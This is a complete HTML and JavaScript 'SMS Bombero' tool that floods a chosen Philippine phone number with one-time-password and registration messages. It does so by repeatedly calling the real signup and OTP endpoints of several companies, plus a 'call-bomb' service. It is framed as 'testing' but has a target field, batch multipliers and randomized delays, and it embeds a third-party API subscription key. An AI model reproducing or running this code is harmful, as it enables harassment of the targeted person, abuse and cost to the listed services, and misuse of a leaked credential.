<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Bombero</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background: #0f0f15;
            color: #d1d5db;
            min-height: 100vh;
        }
        .doom-font {
            font-family: 'Orbitron', monospace;
            font-weight: 900;
        }
        .card {
            background: rgba(30, 41, 59, 0.6);
            border: 1px solid #374151;
            backdrop-filter: blur(10px);
        }
        .input-field {
            background: rgba(17, 24, 39, 0.8);
            border: 1px solid #4b5563;
            color: #e5e7eb;
        }
        .input-field:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
        }
        .btn-primary {
            background: #1e40af;
            color: white;
            transition: all 0.2s;
        }
        .btn-primary:hover {
            background: #1e3a8a;
        }
        .btn-danger {
            background: #dc2626;
            color: white;
        }
        .service-item {
            background: rgba(17, 24, 39, 0.8);
            border: 1px solid #374151;
            transition: all 0.2s;
            cursor: pointer;
        }
        .service-item.selected {
            background: rgba(30, 64, 175, 0.3);
            border-color: #3b82f6;
        }
        .progress-bar {
            background: rgba(17, 24, 39, 0.8);
            border: 1px solid #374151;
        }
        .progress-fill {
            background: #3b82f6;
            transition: width 0.3s ease;
        }
        .slider-track {
            background: #374151;
            height: 4px;
            border-radius: 2px;
        }
        .slider-thumb {
            background: #3b82f6;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            cursor: pointer;
        }
        .slider-dot {
            width: 8px;
            height: 8px;
            background: #4b5563;
            border-radius: 50%;
        }
        .slider-dot.active {
            background: #3b82f6;
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.3);
        }
    </style>
</head>
<body class="p-4 flex items-center justify-center">
    <div class="w-full max-w-2xl">
        <!-- Header -->
        <div class="card rounded-lg p-6 mb-6 text-center">
            <h1 class="doom-font text-3xl text-gray-200 mb-2 tracking-wider">SMS BOMBERO</h1>
            <p class="text-gray-400 text-sm italic">"Intelligence is a tool, not a virtue - it serves both creator and destroyer equally"</p>
        </div>

        <!-- Configuration -->
        <div class="card rounded-lg p-6 mb-6">
            <h2 class="text-lg font-medium text-gray-200 mb-4">Target Configuration</h2>
            
            <div class="grid grid-cols-1 gap-4 mb-4">
                <div>
                    <label class="block text-gray-300 text-sm mb-2">Phone Number</label>
                    <input 
                        type="text" 
                        id="target-number" 
                        placeholder="09XXXXXXXXX or +639XXXXXXXXX"
                        class="input-field w-full p-3 rounded text-sm"
                    >
                </div>
                
                <!-- Iterations Slider -->
                <div>
                    <label class="block text-gray-300 text-sm mb-2">Iterations: <span id="iterations-value">50</span></label>
                    <div class="slider-container relative py-4">
                        <div class="slider-track relative">
                            <div class="absolute inset-0 flex justify-between items-center px-2">
                                <div class="slider-dot" data-value="1"></div>
                                <div class="slider-dot" data-value="25"></div>
                                <div class="slider-dot active" data-value="50"></div>
                                <div class="slider-dot" data-value="75"></div>
                                <div class="slider-dot" data-value="100"></div>
                            </div>
                            <div class="slider-thumb absolute top-1/2 transform -translate-y-1/2" style="left: 49%;"></div>
                        </div>
                        <input type="hidden" id="iterations" value="50">
                    </div>
                </div>

                <!-- Multiplier Slider -->
                <div>
                    <label class="block text-gray-300 text-sm mb-2">Multiplier: <span id="multiplier-value">5</span></label>
                    <div class="slider-container relative py-4">
                        <div class="slider-track relative">
                            <div class="absolute inset-0 flex justify-between items-center px-2">
                                <div class="slider-dot" data-value="1"></div>
                                <div class="slider-dot active" data-value="5"></div>
                                <div class="slider-dot" data-value="10"></div>
                            </div>
                            <div class="slider-thumb absolute top-1/2 transform -translate-y-1/2" style="left: 50%;"></div>
                        </div>
                        <input type="hidden" id="multiplier" value="5">
                    </div>
                </div>
            </div>

            <!-- Service Selection -->
            <div class="mb-4">
                <label class="block text-gray-300 text-sm mb-2">API Selection</label>
                <div id="service-list" class="grid grid-cols-2 gap-2 max-h-32 overflow-y-auto p-3 card rounded">
                    <!-- Services load here -->
                </div>
            </div>

            <button onclick="startTest()" id="start-button" class="btn-primary w-full p-3 rounded text-sm font-medium">
                Start Testing
            </button>
        </div>

        <!-- Progress -->
        <div id="test-progress" class="card rounded-lg p-6 mb-6 hidden">
            <h2 class="text-lg font-medium text-gray-200 mb-4">Test Progress</h2>
            
            <div class="mb-4">
                <div class="flex justify-between text-gray-300 text-sm mb-2">
                    <span>Completion</span>
                    <span id="progress-text">0%</span>
                </div>
                <div class="progress-bar h-2 rounded">
                    <div id="progress-fill" class="progress-fill h-2 rounded" style="width: 0%"></div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 text-center mb-4">
                <div class="card p-3">
                    <div class="text-blue-400 font-medium" id="success-count">0</div>
                    <div class="text-gray-400 text-xs">Successful</div>
                </div>
                <div class="card p-3">
                    <div class="text-red-400 font-medium" id="fail-count">0</div>
                    <div class="text-gray-400 text-xs">Failed</div>
                </div>
            </div>

            <div class="text-center">
                <div id="current-batch" class="text-gray-400 text-sm mb-3">Initializing...</div>
                <button onclick="stopTest()" class="btn-danger w-full p-2 rounded text-sm">
                    Stop Testing
                </button>
            </div>
        </div>

        <!-- Results -->
        <div id="test-results" class="card rounded-lg p-6 mb-6 hidden">
            <h2 class="text-lg font-medium text-gray-200 mb-4">Test Results</h2>
            <div class="text-center">
                <div class="text-2xl font-medium text-gray-200 mb-2" id="total-requests">0</div>
                <div class="text-gray-400 text-sm mb-4">Total API Calls</div>
                <div class="text-sm">
                    <span class="text-blue-400">✓ <span id="result-success">0</span> successful</span> | 
                    <span class="text-red-400">✗ <span id="result-fail">0</span> failed</span>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="text-center text-gray-500 text-xs">
            Developed by <a href="https://t.me/dndvcx" target="_blank" class="text-blue-400 hover:text-blue-300">@dndvcx</a>
        </div>
    </div>

    <script>
        // API endpoints configuration
        const API_ENDPOINTS = {
            "XPRESS": {
                url: "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                method: "POST",
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Dalvik/2.1.0'
                },
                getBody: (phone) => JSON.stringify({
                    FirstName: "Test",
                    LastName: "User", 
                    Email: `test${randomString(8)}@gmail.com`,
                    Phone: phone,
                    Password: "Test123!",
                    ConfirmPassword: "Test123!",
                    FingerprintVisitorId: "TPt0yCuOFim3N3rzvrL1",
                    FingerprintRequestId: "1757149666261.Rr1VvG"
                })
            },
            "ABENSON": {
                url: "https://api.mobile.abenson.com/api/public/membership/activate_otp",
                method: "POST", 
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'okhttp/4.9.0'
                },
                getBody: (phone) => `contact_no=${phone.replace('+63', '')}`
            },
            "FORTUNE_PAY": {
                url: "https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register",
                method: "POST",
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Dart/3.6'
                },
                getBody: (phone) => JSON.stringify({
                    deviceId: randomString(8),
                    deviceType: "GOOGLE_PLAY", 
                    companyId: "4b",
                    dialCode: "+63",
                    phoneNumber: phone.replace('+63', '')
                })
            },
            "LBC": {
                url: "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",
                method: "POST",
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Dart/2.19'
                },
                getBody: (phone) => {
                    const params = new URLSearchParams({
                        verification_type: "mobile",
                        client_email: `${randomString(8)}@gmail.com`,
                        client_contact_code: "+63",
                        client_contact_no: phone.replace('+63', ''),
                        app_log_uid: randomString(16)
                    });
                    return params.toString();
                }
            },
            "PICKUP_COFFEE": {
                url: "https://production.api.pickup-coffee.net/v2/customers/login", 
                method: "POST",
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'okhttp/4.12.0'
                },
                getBody: (phone) => JSON.stringify({
                    mobile_number: phone,
                    login_method: "mobile_number"
                })
            },
            "HONEY_LOAN": {
                url: "https://api.honeyloan.ph/api/client/registration/step-one",
                method: "POST",
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                getBody: (phone) => JSON.stringify({
                    phone: phone,
                    is_rights_block_accepted: 1
                })
            },
            "KOMO_PH": {
                url: "https://api.komo.ph/api/otp/v5/generate",
                method: "POST",
                headers: {
                    'Content-Type': 'application/json',
                    'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
                },
                getBody: (phone) => JSON.stringify({
                    mobile: phone,
                    transactionType: 6
                })
            },
            "CALL_BOMB": {
                url: "https://call-bomb.onrender.com/",
                method: "POST",
                headers: {
                    'Content-Type': 'application/json'
                },
                getBody: (phone) => JSON.stringify({
                    phone: phone
                })
            }
        };

        let selectedServices = Object.keys(API_ENDPOINTS);
        let isTesting = false;
        let testStats = { success: 0, failed: 0 };
        let abortController = null;

        // Slider functionality
        function initSliders() {
            // Iterations slider
            const iterationsSlider = document.querySelector('#iterations').closest('.slider-container');
            const iterationsThumb = iterationsSlider.querySelector('.slider-thumb');
            const iterationsValue = document.getElementById('iterations-value');
            const iterationsInput = document.getElementById('iterations');
            
            // Multiplier slider
            const multiplierSlider = document.querySelector('#multiplier').closest('.slider-container');
            const multiplierThumb = multiplierSlider.querySelector('.slider-thumb');
            const multiplierValue = document.getElementById('multiplier-value');
            const multiplierInput = document.getElementById('multiplier');

            function setupSlider(container, thumb, valueDisplay, input, values, defaultValue) {
                const dots = container.querySelectorAll('.slider-dot');
                
                dots.forEach(dot => {
                    dot.addEventListener('click', () => {
                        const value = parseInt(dot.dataset.value);
                        input.value = value;
                        valueDisplay.textContent = value;
                        
                        // Update active dot
                        dots.forEach(d => d.classList.remove('active'));
                        dot.classList.add('active');
                        
                        // Update thumb position
                        const index = values.indexOf(value);
                        const percentage = (index / (values.length - 1)) * 100;
                        thumb.style.left = `${percentage}%`;
                    });
                });
            }

            // Setup both sliders
            setupSlider(iterationsSlider, iterationsThumb, iterationsValue, iterationsInput, [1, 25, 50, 75, 100], 50);
            setupSlider(multiplierSlider, multiplierThumb, multiplierValue, multiplierInput, [1, 5, 10], 5);
        }

        function renderServices() {
            const serviceList = document.getElementById('service-list');
            serviceList.innerHTML = '';
            
            Object.keys(API_ENDPOINTS).forEach(service => {
                const isSelected = selectedServices.includes(service);
                const serviceItem = document.createElement('div');
                serviceItem.className = `service-item p-2 rounded cursor-pointer text-xs ${isSelected ? 'selected' : ''}`;
                serviceItem.textContent = service.replace(/_/g, ' ');
                serviceItem.onclick = () => toggleService(service);
                serviceList.appendChild(serviceItem);
            });
        }

        function toggleService(service) {
            const index = selectedServices.indexOf(service);
            if (index > -1) {
                selectedServices.splice(index, 1);
            } else {
                selectedServices.push(service);
            }
            renderServices();
        }

        function normalizePhoneNumber(phone) {
            phone = phone.trim().replace(/[^0-9+]/g, '');
            if (phone.startsWith('+639') && phone.length === 13) return phone;
            if (phone.startsWith('639') && phone.length === 12) return '+' + phone;
            if (phone.startsWith('09') && phone.length === 11) return '+63' + phone.substring(1);
            if (phone.startsWith('9') && phone.length === 10) return '+63' + phone;
            return null;
        }

        function randomString(length) {
            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        function randomDelay(min = 500, max = 2000) {
            return Math.floor(Math.random() * (max - min) + min);
        }

        async function makeApiRequest(service, phoneNumber) {
            const endpoint = API_ENDPOINTS[service];
            const normalizedPhone = normalizePhoneNumber(phoneNumber);
            
            if (!normalizedPhone) return false;

            try {
                abortController = new AbortController();
                
                const options = {
                    method: endpoint.method,
                    headers: endpoint.headers,
                    body: endpoint.getBody(normalizedPhone),
                    signal: abortController.signal,
                    mode: 'cors',
                    credentials: 'omit'
                };

                // Add timeout
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Timeout')), 10000)
                );

                const fetchPromise = fetch(endpoint.url, options);
                
                const response = await Promise.race([fetchPromise, timeoutPromise]);
                
                // Consider 200-299 and sometimes 400-499 as "success" for testing purposes
                return response.status >= 200 && response.status < 500;
                
            } catch (error) {
                console.log(`Service ${service} failed:`, error.message);
                return false;
            }
        }

        async function startTest() {
            if (isTesting) return;
            
            const target = document.getElementById('target-number').value.trim();
            const iterations = parseInt(document.getElementById('iterations').value);
            const multiplier = parseInt(document.getElementById('multiplier').value);
            
            if (!target) {
                alert('Please enter a phone number');
                return;
            }
            
            if (selectedServices.length === 0) {
                alert('Please select at least one API endpoint');
                return;
            }

            const normalizedPhone = normalizePhoneNumber(target);
            if (!normalizedPhone) {
                alert('Invalid phone number format. Use: 09XXXXXXXXX, 639XXXXXXXXX, or +639XXXXXXXXX');
                return;
            }

            isTesting = true;
            testStats = { success: 0, failed: 0 };
            abortController = new AbortController();
            
            document.getElementById('test-progress').classList.remove('hidden');
            document.getElementById('test-results').classList.add('hidden');
            document.getElementById('start-button').disabled = true;
            
            updateProgress(0, iterations);
            
            for (let i = 1; i <= iterations && isTesting; i++) {
                const totalRequests = selectedServices.length * multiplier;
                document.getElementById('current-batch').textContent = 
                    `Batch ${i} of ${iterations} - ${totalRequests} requests (${selectedServices.length} APIs × ${multiplier} multiplier)`;
                
                // Create all requests for this batch
                const requests = [];
                for (let service of selectedServices) {
                    for (let m = 0; m < multiplier; m++) {
                        requests.push(makeApiRequest(service, target));
                    }
                }
                
                // Execute with rate limiting - max 2 concurrent per service
                const results = await Promise.allSettled(requests);
                
                results.forEach(result => {
                    if (result.status === 'fulfilled' && result.value) {
                        testStats.success++;
                    } else {
                        testStats.failed++;
                    }
                });
                
                updateProgress(i, iterations);
                
                // Random delay between batches
                if (i < iterations && isTesting) {
                    const delay = randomDelay(2000, 4000);
                    document.getElementById('current-batch').textContent = 
                        `Batch ${i} of ${iterations} - Cooling down for ${delay/1000}s`;
                    await new Promise(resolve => setTimeout(resolve, delay));
                }
            }
            
            isTesting = false;
            document.getElementById('test-progress').classList.add('hidden');
            document.getElementById('test-results').classList.remove('hidden');
            document.getElementById('start-button').disabled = false;
            
            const totalRequests = testStats.success + testStats.failed;
            document.getElementById('total-requests').textContent = totalRequests;
            document.getElementById('result-success').textContent = testStats.success;
            document.getElementById('result-fail').textContent = testStats.failed;
        }

        function stopTest() {
            isTesting = false;
            if (abortController) {
                abortController.abort();
            }
            document.getElementById('test-progress').classList.add('hidden');
            document.getElementById('start-button').disabled = false;
        }

        function updateProgress(current, total) {
            const percent = (current / total) * 100;
            document.getElementById('progress-text').textContent = `${Math.round(percent)}%`;
            document.getElementById('progress-fill').style.width = `${percent}%`;
            document.getElementById('success-count').textContent = testStats.success;
            document.getElementById('fail-count').textContent = testStats.failed;
        }

        document.addEventListener('DOMContentLoaded', function() {
            initSliders();
            renderServices();
        });
    </script>
</body>
</html>
